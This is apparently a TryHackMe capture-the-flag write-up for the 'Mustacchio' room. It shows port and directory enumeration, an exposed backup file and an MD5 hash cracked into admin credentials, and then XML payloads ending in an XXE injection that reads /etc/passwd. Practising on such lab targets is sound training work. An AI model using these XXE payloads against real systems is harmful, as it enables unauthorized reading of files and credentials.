# Mustacchio

![image](https://user-images.githubusercontent.com/5285547/121743836-e0ac7c80-caf9-11eb-8112-a3e7e5a189bc.png)

[Room Link](https://tryhackme.com/room/mustacchio)

## Enumeration

### Nmap
```bash
nmap -p- -v 10.10.68.59
```

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http

```

### Gobuster 

```bash
gobuster dir -u http://10.10.68.59  -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,html,gz,php,js,zip,img,bak -t 45
```
http://10.10.68.59/
```bash
/gallery.html         (Status: 200) [Size: 1950]
/index.html           (Status: 200) [Size: 1752]
/images               (Status: 301) [Size: 311] [--> http://10.10.68.59/images/]
/contact.html         (Status: 200) [Size: 1450]                                
/blog.html            (Status: 200) [Size: 3172]                                
/about.html           (Status: 200) [Size: 3152]                                
/custom               (Status: 301) [Size: 311] [--> http://10.10.68.59/custom/]
/robots.txt           (Status: 200) [Size: 28]                                  
/fonts                (Status: 301) [Size: 310] [--> http://10.10.68.59/fonts/] 
```
http://10.10.68.59/custom/
```bash
/css                  (Status: 301) [Size: 315] [--> http://10.10.68.59/custom/css/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.68.59/custom/js/]
```
http://10.10.68.59/custom/js/
```bash
/users.bak            (Status: 200) [Size: 8192]
/mobile.js            (Status: 200) [Size: 1470]
```

Here we find a users.bak file. We can download and check the contents.
Which seem to be a mysql or database command for creating a new user

![image](https://user-images.githubusercontent.com/5285547/121745773-be682e00-cafc-11eb-951c-aff68f56f379.png)

So now we have a username: Admin 

http:10.10.68.59:8765/
```bash
/home.php             (Status: 302) [Size: 1993] [--> ../index.php]
/index.php            (Status: 200) [Size: 1363]                   
/assets               (Status: 301) [Size: 194] [--> http://10.10.68.59:8765/assets/]
/auth                 (Status: 301) [Size: 194] [--> http://10.10.68.59:8765/auth/] 
```


## Website's (port 80, 8765)

### Port 80

This portal contains a blog for "mustacchio" brand for all mankind!

![image](https://user-images.githubusercontent.com/5285547/121744541-f9696200-cafa-11eb-9b2f-eeb05996505d.png)

Checking the webpages source code revealed nothing, but i noted a mobile.js script file included. Pressing F12 and using the developer console. I looked at the source code for the mobile.js file. 

![image](https://user-images.githubusercontent.com/5285547/121744888-7b598b00-cafb-11eb-8b8d-6741f1d9b90b.png)

I see some md5 at the bottom of the source code so try it on https://crackstation.net/ 

We get a hit

![image](https://user-images.githubusercontent.com/5285547/121745099-d55a5080-cafb-11eb-852e-bb56347012c3.png)

Now we have a username and password but nowhere to use them!?

Let's move on to the next port. 


### Port 8765

http://10.10.68.59:8765/

This page presents us with what we need for our credentials, a login page. 

![image](https://user-images.githubusercontent.com/5285547/121746171-5d8d2580-cafd-11eb-9c70-328eff1493a4.png)

After loggin in we get presented with this page

![image](https://user-images.githubusercontent.com/5285547/121746302-94633b80-cafd-11eb-8967-24ee1bc995f4.png)

Pressing the submit button causes a pop up box to appear

![image](https://user-images.githubusercontent.com/5285547/121746351-ad6bec80-cafd-11eb-9b68-e51cd7b0a08b.png)

Like it said to, inject some xml!
I got a payload from the internet here: https://github.com/payloadbox/xxe-injection-payload-list
After injection, some text appereard at the bottom of the page, indicating some structure needed for the xml.

![image](https://user-images.githubusercontent.com/5285547/121746652-1d7a7280-cafe-11eb-88c7-e39980cafe3f.png)

Checking our payload sent.

```xml
<!--?xml version="1.0" ?-->
<userInfo>
 <firstName>John</firstName>
 <lastName>Doe</lastName>
</userInfo>
```

Then noting the response we got, which was Comment Preview,Name, Author, Comment. I built a simuilar xml element with a root tag.

```xml
<!--?xml version="1.0" ?-->
<root>
 <commentPreview>John</commentPreview>
 <name>Doe</name>
 <author>Doe</author>
 <comment>John</comment>
</root>
```

Injecting this into the page left me with better results. 

![image](https://user-images.githubusercontent.com/5285547/121747164-dd67bf80-cafe-11eb-937a-bb120221768d.png)

Lets try to get a file next /etc/passwd as the usual test

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<root>
 <commentPreview>John</commentPreview>
 <name>&ent;</name>
 <author>Doe</author>
 <comment>John</comment>
</root>
```

![image](https://user-images.githubusercontent.com/5285547/121747246-05572300-caff-11eb-8005-17bd6a5b86aa.png)
![image](https://user-images.githubusercontent.com/5285547/121747279-13a53f00-caff-11eb-95b2-48b44ee149e2.png)



